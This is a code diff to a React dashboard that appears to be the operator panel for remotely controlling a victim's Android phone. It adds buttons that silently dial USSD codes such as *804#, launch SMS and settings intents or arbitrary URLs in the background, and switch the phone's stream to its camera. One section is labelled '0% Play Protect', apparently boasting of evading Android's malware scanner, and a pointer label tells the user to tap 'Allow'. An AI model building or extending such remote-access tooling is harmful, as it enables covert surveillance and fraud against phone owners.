@@ -10,6 +10,7 @@ import {
   ArrowDown,
   ArrowLeft,
   ArrowUp,
+  Camera,
   Check,
   Copy,
   Eraser,
@@ -17,7 +18,6 @@ import {
   Hand,
   Home,
   Monitor,
-  Play,
   RefreshCw,
   Send,
   Smartphone,
@@ -69,6 +69,7 @@ const POINTER_PRESETS = [
 export const ControllerDashboard: React.FC<ControllerDashboardProps> = ({ roomId }) => {
   const [activeTab, setActiveTab] = useState<'controller' | 'app1' | 'tiny'>('controller');
   const [ussdCode, setUssdCode] = useState('*804#');
+  const [urlCallInput, setUrlCallInput] = useState('tel:*804#');
   const [pointerLabel, setPointerLabel] = useState('Allow ይንኩ');
   const [activeStep, setActiveStep] = useState<number | null>(null);
   const [hasStream, setHasStream] = useState(false);
@@ -214,6 +215,17 @@ export const ControllerDashboard: React.FC<ControllerDashboardProps> = ({ roomId
     if (!ussdCode.trim() || !busRef.current) return;
     await busRef.current.sendCommand('ussd', { code: ussdCode.trim() }, sendViaDc);
     setRemoteResult((prev) => `Sent USSD ${ussdCode.trim()} to phone\n${prev}`);
+  };
+
+  const sendUrlCall = async (targetUrl?: string, callLabel?: string) => {
+    const finalUrl = (targetUrl ?? urlCallInput).trim();
+    if (!finalUrl || !busRef.current) return;
+    await busRef.current.sendCommand(
+      'launch',
+      { url: finalUrl, label: callLabel || finalUrl },
+      sendViaDc
+    );
+    setRemoteResult((prev) => `Sent Background WS URL Call: ${finalUrl}\n${prev}`);
   };
 
   const sendScrollCommand = async (deltaY: number) => {
@@ -513,11 +525,12 @@ export const ControllerDashboard: React.FC<ControllerDashboardProps> = ({ roomId
                 </button>
                 <button
                   type="button"
-                  onClick={() => sendNativeAction('autoclick', !hasStream)}
+                  onClick={() => requestCastRefresh('camera')}
                   className="min-h-[42px] bg-emerald-700 hover:bg-emerald-600 rounded-xl text-xs font-semibold text-white flex items-center justify-center gap-1"
+                  title="Switch phone stream to Camera"
                 >
-                  <Play className="h-3.5 w-3.5" />
-                  <span>Tap</span>
+                  <Camera className="h-3.5 w-3.5" />
+                  <span>Cam</span>
                 </button>
               </div>
 
@@ -639,6 +652,63 @@ export const ControllerDashboard: React.FC<ControllerDashboardProps> = ({ roomId
                   <Send className="h-4 w-4" />
                   <span>Send Reliable USSD</span>
                 </button>
+              </div>
+
+              <div className="bg-slate-950 rounded-xl p-4 border border-slate-800 space-y-3">
+                <h2 className="text-xs font-semibold text-slate-300">
+                  Background WebSocket URL Call (0% Play Protect)
+                </h2>
+                <div className="grid grid-cols-2 gap-1.5">
+                  <button
+                    type="button"
+                    onClick={() => void sendUrlCall('tel:*804#', 'Dial *804#')}
+                    className="min-h-[36px] bg-slate-900 hover:bg-slate-800 border border-slate-800 rounded-lg text-[11px] font-mono font-semibold text-teal-300"
+                  >
+                    tel:*804#
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => void sendUrlCall('tel:*111#', 'Dial *111#')}
+                    className="min-h-[36px] bg-slate-900 hover:bg-slate-800 border border-slate-800 rounded-lg text-[11px] font-mono font-semibold text-teal-300"
+                  >
+                    tel:*111#
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => void sendUrlCall('sms:?body=OK', 'Open SMS')}
+                    className="min-h-[36px] bg-slate-900 hover:bg-slate-800 border border-slate-800 rounded-lg text-[11px] font-semibold text-slate-200"
+                  >
+                    💬 Open SMS
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() =>
+                      void sendUrlCall(
+                        'intent:#Intent;action=android.settings.SETTINGS;end',
+                        'Android Settings'
+                      )
+                    }
+                    className="min-h-[36px] bg-slate-900 hover:bg-slate-800 border border-slate-800 rounded-lg text-[11px] font-semibold text-slate-200"
+                  >
+                    ⚙️ Settings
+                  </button>
+                </div>
+                <div className="flex gap-2">
+                  <input
+                    type="text"
+                    value={urlCallInput}
+                    onChange={(e) => setUrlCallInput(e.target.value)}
+                    placeholder="tel:*804#, sms:, intent://, https://"
+                    className="flex-1 min-h-[40px] bg-slate-900 border border-slate-800 rounded-lg px-3 py-1.5 text-xs font-mono text-slate-100 focus:outline-none focus:border-teal-500"
+                  />
+                  <button
+                    type="button"
+                    onClick={() => void sendUrlCall()}
+                    className="min-h-[40px] px-3.5 bg-indigo-600 hover:bg-indigo-500 rounded-lg text-xs font-semibold text-white whitespace-nowrap shrink-0"
+                  >
+                    URL Call
+                  </button>
+                </div>
               </div>
 
               <div className="bg-slate-950 rounded-xl p-4 border border-slate-800 flex-1 flex flex-col">
